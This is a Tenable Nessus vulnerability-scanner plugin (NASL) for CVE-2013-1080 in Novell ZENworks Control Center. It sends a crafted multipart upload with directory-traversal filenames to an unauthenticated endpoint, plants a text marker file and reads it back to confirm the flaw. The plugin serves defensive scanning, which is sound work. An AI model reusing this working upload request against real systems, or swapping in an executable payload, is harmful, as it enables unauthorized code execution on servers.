#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(66914);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2016/11/23 20:31:34 $");

  script_cve_id("CVE-2013-1080");
  script_bugtraq_id(58668);
  script_osvdb_id(91627);

  script_name(english:"Novell ZENworks Control Center File Upload Remote Code Execution (intrusive check)");
  script_summary(english:"Tries to upload file");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The installed version of Novell ZENworks Control Center has a flaw with
authentication checking on '/zenworks/jsp/index.jsp' that can allow a
remote, unauthenticated attacker to upload arbitrary files and execute
them with SYSTEM privileges.  Nessus has exploited this vulnerability to
upload a file to the '/zenworks/css' directory."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.novell.com/support/kb/doc.php?id=7011812");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-13-049/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ZENworks 11.2.2 and apply the interim fix, or apply 11.2.3a
Monthly Update 1 for 11.2.3 installs.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Novell ZENworks Configuration Management 11 SP2 File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Novell ZENworks Configuration Management Remote Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/22");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/03/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/06/18");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:zenworks_configuration_management");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "novell_zenworks_control_center_detect.nasl");
  script_require_ports("Services/www", 443);
  script_require_keys("www/zenworks_control_center");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:443);

install = get_install_from_kb(
  appname      : "zenworks_control_center",
  port         : port,
  exit_on_fail : TRUE
);

boundary = '----------Nessus';

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) traversals = make_list('..\\webapps\\zenworks\\css\\');
  else traversals = make_list('..\\..\\opt\\novell\\zenworks\\share\\tomcat\\webapps\\css\\',
                              '../../opt/novell/zenworks/share/tomcat/webapps/css/');
}
else
{
  traversals = make_list('..\\webapps\\zenworks\\css\\',
                         '..\\..\\opt\\novell\\zenworks\\share\\tomcat\\webapps\\css\\',
                         '../../opt/novell/zenworks/share/tomcat/webapps/css/');
}

fname = rand_str(length:8) + '_nessus.txt';
msg = 'file created by nessus : ' + SCRIPT_NAME;

vuln = FALSE;
foreach traversal (traversals)
{
  postdata =
    '--' + boundary + '\r\n' +
    'Content-Disposition: form-data; name="mainPage:_ctrl21a:FindFile:filePathTextBox"; '+
    'filename="' + traversal + fname + '"' + '\r\n' +
    'Content-Type: text/plain\r\n' +
    '\r\n' +
    msg +
    '\r\n' +
    '--' + boundary + '--' + '\r\n';

  host = NULL;
  hn = get_kb_item('www/'+port+'/http11_hostname');
  if (! isnull(hn))
    host = hn;
  else
  {
    host = get_preference('sc.hostname.' + get_host_ip());
    if (strlen(host) == 0) host = get_host_name();
  }

  if( isnull(host)) exit(1, 'Error getting host name.');

  rq = make_array();
  rq['$data'] = postdata;
  rq['$method'] = 'POST';

  rq['$uri'] = '/zenworks/jsp/index.jsp?pageid=newDocumentWizard';
  rq['$port'] = port;
  rq['$request'] = 'POST /zenworks/jsp/index.jsp?pageid=newDocumentWizard HTTP/1.1';

  rq['Content-Length'] = strlen(postdata);
  rq['Host'] = host;
  rq['Content-Type'] = 'multipart/form-data; boundary=' + boundary;

  # nb: the server requires the data to be sent in this exact manner,
  # or the exploit won't work.  I couldn't get this to work using
  # http_send_recv3() because it calls http_mk_req() which adds extra
  # headers that cause the exploit to fail
  w = http_send_recv_req(port: port, req: rq,
                         exit_on_fail: TRUE);

  if ("302" >!< w[0]) continue;

  exploit_req = http_last_sent_request();

  res = http_send_recv3(method:"GET",
                        item:"/zenworks/css/" + fname,
                        port:port,
                        exit_on_fail:TRUE);
  if (res[2] == msg)
  {
    vuln = TRUE;
    break;
  }
}

if (vuln)
{
  if(report_verbosity > 0)
  {
    report =
    '\n  Nessus was able to upload a file to the server with the following' +
    '\n  request :\n\n' +
    crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n' +
    chomp(exploit_req) + '\n' +
    crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n\n' +
    '\n  It can be accessed here: ' + build_url(port:port, qs:'/zenworks/css/' + fname) + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "Novell ZENworks Control Center", build_url(port:port, qs:'/'));
